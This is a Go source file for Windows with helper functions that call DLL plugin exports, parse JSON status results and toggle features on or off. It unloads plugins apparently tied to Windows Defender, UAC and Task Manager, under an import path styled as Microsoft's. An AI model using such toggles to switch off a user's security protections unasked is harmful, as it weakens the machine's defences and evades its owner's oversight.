//go:build windows

package sysutil

import (
	"encoding/json"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/loader"
)

func pStr(p *loader.Plugin, export string, cap int) string {
	buf := make([]byte, cap)
	n, err := p.Call(export, uintptr(unsafe.Pointer(&buf[0])), uintptr(cap))
	if err != nil {
		return ""
	}
	return string(buf[:int(n)])
}

func pNum(p *loader.Plugin, export string) int {
	ret, err := p.Call(export)
	if err != nil {
		return 0
	}
	return int(ret)
}

func pU64(p *loader.Plugin, export string) uint64 {
	ret, err := p.Call(export)
	if err != nil {
		return 0
	}
	return uint64(ret)
}

func pU64Drive(p *loader.Plugin, export, drive string) uint64 {
	ret, err := p.Call(export, uintptr(unsafe.Pointer(loader.BytePtr(drive))))
	if err != nil {
		return 0
	}
	return uint64(ret)
}

func pNumDrive(p *loader.Plugin, export, drive string) int {
	ret, err := p.Call(export, uintptr(unsafe.Pointer(loader.BytePtr(drive))))
	if err != nil {
		return 0
	}
	return int(ret)
}

func dllStrCall(dll func(func(*loader.Plugin)), export string) string {
	var result string
	dll(func(p *loader.Plugin) { result = pStr(p, export, 256) })
	return result
}

type dllResult struct {
	OK     bool   `json:"ok"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func parseDLLResult(raw string) dllResult {
	var r dllResult
	json.Unmarshal([]byte(raw), &r)
	return r
}

func dllToggle(dll func(func(*loader.Plugin)), statusExport, enableExport, disableExport string) (string, bool) {
	var newStatus string
	var ok bool
	dll(func(p *loader.Plugin) {
		sr := parseDLLResult(pStr(p, statusExport, 256))
		export := disableExport
		newStatus = "disabled"
		if sr.Status != "enabled" {
			export = enableExport
			newStatus = "enabled"
		}
		ar := parseDLLResult(pStr(p, export, 256))
		if !ar.OK {
			newStatus = sr.Status
		}
		ok = ar.OK
	})
	return newStatus, ok
}

func UnloadControlPanelDLLs() {
	DefenderUnload()
	UACUnload()
	TaskMgrUnload()
	VolUnload()
}
